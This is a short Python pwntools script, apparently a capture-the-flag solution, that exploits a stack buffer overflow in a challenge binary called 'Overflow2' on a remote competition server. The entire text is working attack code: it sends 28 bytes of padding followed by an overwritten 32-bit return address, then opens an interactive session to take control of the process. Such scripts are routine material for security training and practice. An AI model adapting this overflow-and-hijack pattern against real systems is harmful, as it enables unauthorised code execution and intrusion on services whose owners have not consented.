from pwn import *

local = False
host = 'cyberyoddha.baycyber.net'
port = 10002

if local == True:
	p = process('./Overflow2')
else:
	p = remote(host, port)

payload = b'A'*28
payload += p32(0x08049172)

p.sendline(payload)

p.interactive()
